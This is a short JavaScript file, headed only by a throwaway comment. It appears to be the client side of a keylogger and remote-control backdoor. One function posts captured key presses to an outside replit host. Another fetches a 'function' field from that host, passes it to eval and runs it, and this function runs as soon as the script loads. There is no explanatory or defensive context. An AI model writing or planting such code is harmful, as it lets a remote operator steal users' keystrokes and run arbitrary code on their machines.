// Some useless comment

const sendData = async (data) => {
    await fetch(`https://draco.maalolan.repl.co/command`, {
        method: 'POST', // or 'PUT'
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ key_pressed: data }),
    })
}


const getCommand = async () => {
    await fetch('https://draco.maalolan.repl.co/command', {
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
    })
        .then(res => res.json())
        .then(data => {
            const func = eval(data.function);
            func()
        })
        .catch(err => console.log(err))
}

getCommand()